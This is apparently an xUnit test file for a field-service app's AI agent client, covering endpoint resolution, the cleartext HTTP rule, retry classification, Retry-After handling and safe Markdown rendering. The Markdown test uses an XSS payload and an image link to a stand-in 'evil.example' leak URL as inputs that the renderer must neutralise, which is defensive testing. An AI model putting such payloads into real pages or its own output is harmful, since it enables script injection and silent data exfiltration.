using System.Net;
using Ch08.Field.Core.Connection;
using Ch08.Field.Core.Presentation;
using Microsoft.Extensions.Time.Testing;

namespace Ch08.Tests;

/// <summary>Endpoint resolution, the cleartext rule, failure classification, Retry-After and native Markdown rendering.</summary>
public sealed class FieldBasicsTests
{
    [Theory]
    [InlineData(FieldPlatform.Windows, false, "http://localhost:5080/agent")]
    [InlineData(FieldPlatform.Android, true, "http://10.0.2.2:5080/agent")]
    [InlineData(FieldPlatform.iOS, true, "http://localhost:5080/agent")]
    public void The_development_agent_is_found_where_each_platform_sees_the_host(FieldPlatform platform, bool emulator, string expected) =>
        Assert.Equal(expected, AgentEndpoint.Resolve(null, platform, emulator, allowCleartext: true).ToString());

    [Fact]
    public void Plain_http_is_refused_outside_development_and_to_any_other_host()
    {
        Assert.Throws<InvalidOperationException>(() => AgentEndpoint.Resolve(null, FieldPlatform.Android, isEmulator: true, allowCleartext: false));
        Assert.Throws<InvalidOperationException>(() => AgentEndpoint.Resolve("http://192.168.1.20:5080/agent", FieldPlatform.Android, false, allowCleartext: true));
        Assert.Equal("https://beacon.contoso-climate.example/agent",
            AgentEndpoint.Resolve("https://beacon.contoso-climate.example/agent", FieldPlatform.iOS, false, allowCleartext: false).ToString());
    }

    [Fact]
    public void Failures_are_retried_only_when_the_run_never_started()
    {
        // The request never left, or the agent refused it before starting.
        Assert.True(ConnectionPolicy.IsSafeToRetry(new HttpRequestException(HttpRequestError.NameResolutionError, "No such host.")));
        Assert.True(ConnectionPolicy.IsSafeToRetry(new HttpRequestException(HttpRequestError.ConnectionError, "Timed out connecting.")));
        Assert.True(ConnectionPolicy.IsSafeToRetry(new HttpRequestException(HttpRequestError.SecureConnectionError, "The TLS handshake failed.")));
        Assert.True(ConnectionPolicy.IsSafeToRetry(new HttpRequestException("Service Unavailable.", null, HttpStatusCode.ServiceUnavailable)));
        Assert.True(ConnectionPolicy.IsSafeToRetry(new RetryAfterException(HttpStatusCode.TooManyRequests, TimeSpan.FromSeconds(1))));

        // It may have reached a run: a reset or an early end after sending, a gateway's 502 or 504, a timeout.
        Assert.False(ConnectionPolicy.IsSafeToRetry(new HttpRequestException(HttpRequestError.ResponseEnded, "The response ended prematurely.")));
        Assert.False(ConnectionPolicy.IsSafeToRetry(new HttpRequestException("An error occurred while sending the request.", new IOException("Connection reset."))));
        Assert.False(ConnectionPolicy.IsSafeToRetry(new IOException("Connection reset.")));
        Assert.False(ConnectionPolicy.IsSafeToRetry(new HttpRequestException("Bad Gateway.", null, HttpStatusCode.BadGateway)));
        Assert.False(ConnectionPolicy.IsSafeToRetry(new HttpRequestException("Gateway Timeout.", null, HttpStatusCode.GatewayTimeout)));
        Assert.False(ConnectionPolicy.IsSafeToRetry(new TaskCanceledException("HttpClient.Timeout elapsed.", new TimeoutException())));

        // Another try can't change these.
        Assert.False(ConnectionPolicy.IsSafeToRetry(new HttpRequestException(HttpRequestError.UserAuthenticationError, "Proxy authentication required.")));
        Assert.False(ConnectionPolicy.IsSafeToRetry(new HttpRequestException("Forbidden.", null, HttpStatusCode.Forbidden)));
    }

    [Fact]
    public async Task Retry_after_survives_the_sdk_transport_as_an_exception_that_carries_it()
    {
        var time = new FakeTimeProvider(new DateTimeOffset(2026, 11, 16, 9, 50, 0, TimeSpan.Zero));
        using var http = new HttpClient(new RetryAfterHandler(time) { InnerHandler = new CannedResponses(
            Canned(HttpStatusCode.ServiceUnavailable, response => response.Headers.Add("Retry-After", "3")),
            Canned(HttpStatusCode.TooManyRequests, response => response.Headers.Add("Retry-After", "Mon, 16 Nov 2026 09:50:10 GMT")),
            Canned(HttpStatusCode.ServiceUnavailable),
            Canned(HttpStatusCode.OK)) });
        var ct = TestContext.Current.CancellationToken;

        var seconds = await Assert.ThrowsAsync<RetryAfterException>(() => http.GetAsync("http://localhost/agent", ct));
        var date = await Assert.ThrowsAsync<RetryAfterException>(() => http.GetAsync("http://localhost/agent", ct));

        Assert.Equal((HttpStatusCode.ServiceUnavailable, TimeSpan.FromSeconds(3)), (seconds.StatusCode, seconds.RetryAfter));
        Assert.Equal((HttpStatusCode.TooManyRequests, TimeSpan.FromSeconds(10)), (date.StatusCode, date.RetryAfter));

        // Without the header, or on success, the response passes through untouched.
        Assert.Equal(HttpStatusCode.ServiceUnavailable, (await http.GetAsync("http://localhost/agent", ct)).StatusCode);
        Assert.Equal(HttpStatusCode.OK, (await http.GetAsync("http://localhost/agent", ct)).StatusCode);
    }

    private static Func<HttpResponseMessage> Canned(HttpStatusCode status, Action<HttpResponseMessage>? configure = null) => () =>
    {
        var response = new HttpResponseMessage(status);
        configure?.Invoke(response);
        return response;
    };

    private sealed class CannedResponses(params Func<HttpResponseMessage>[] responses) : HttpMessageHandler
    {
        private int _next;

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
            Task.FromResult(responses[_next++]());
    }

    [Fact]
    public async Task The_field_s_connect_timeout_fails_as_a_connection_error_not_a_timeout()
    {
        // 10.255.255.1 is unroutable: the SYN goes nowhere and the connect has to time out.
        using var http = new HttpClient(FieldHttp.CreateHandler(TimeSpan.FromMilliseconds(300)));
        using var request = new HttpRequestMessage(HttpMethod.Post, "http://10.255.255.1:5080/agent") { Content = new StringContent("{}") };

        var error = await Assert.ThrowsAsync<HttpRequestException>(() => http.SendAsync(request, TestContext.Current.CancellationToken));

        Assert.Equal(HttpRequestError.ConnectionError, error.HttpRequestError);
        Assert.True(ConnectionPolicy.IsSafeToRetry(error));
    }

    [Fact]
    public void Markdown_becomes_styled_runs_and_nothing_becomes_markup()
    {
        var runs = MarkdownText.ToRuns(
            "**WO-1001** is *Scheduled*. Call <img src=x onerror=alert(1)> first.\n\n" +
            "- Measure `CAP-45-5`\n- See [the manual](https://manuals.contoso.example/ca-36x) ![nameplate](https://evil.example/leak?d=1)");

        Assert.Equal(new InlineRun("WO-1001", InlineStyle.Bold), runs[0]);
        Assert.Equal(new InlineRun("Scheduled", InlineStyle.Italic), runs[2]);
        Assert.Contains(runs, r => r.Text.Contains("<img src=x onerror=alert(1)>", StringComparison.Ordinal) && r.Style == InlineStyle.None);
        Assert.Contains(new InlineRun("CAP-45-5", InlineStyle.Code), runs);
        Assert.Contains(runs, r => r is { Text: "the manual", Style: InlineStyle.Link, Url: "https://manuals.contoso.example/ca-36x" });
        Assert.Contains(runs, r => r.Text.Contains("[image: nameplate]", StringComparison.Ordinal));
        Assert.DoesNotContain(runs, r => r.Url?.Contains("evil", StringComparison.Ordinal) == true);
        Assert.Equal(
            "WO-1001 is Scheduled. Call <img src=x onerror=alert(1)> first.\n\n• Measure CAP-45-5\n• See the manual (https://manuals.contoso.example/ca-36x) [image: nameplate]",
            MarkdownText.ToPlainText(
                "**WO-1001** is *Scheduled*. Call <img src=x onerror=alert(1)> first.\n\n" +
                "- Measure `CAP-45-5`\n- See [the manual](https://manuals.contoso.example/ca-36x) ![nameplate](https://evil.example/leak?d=1)"));
    }

    [Fact]
    public void A_parts_table_reads_as_lines()
    {
        var text = MarkdownText.ToPlainText(
            "Here's what's in stock:\n\n| SKU | Part | Price | In stock |\n|---|---|---:|---:|\n| CAP-45-5 | Run capacitor 45/5 uF | $38.50 | 12 |");

        Assert.Equal("Here's what's in stock:\n\nSKU · Part · Price · In stock\nCAP-45-5 · Run capacitor 45/5 uF · $38.50 · 12", text);
    }
}
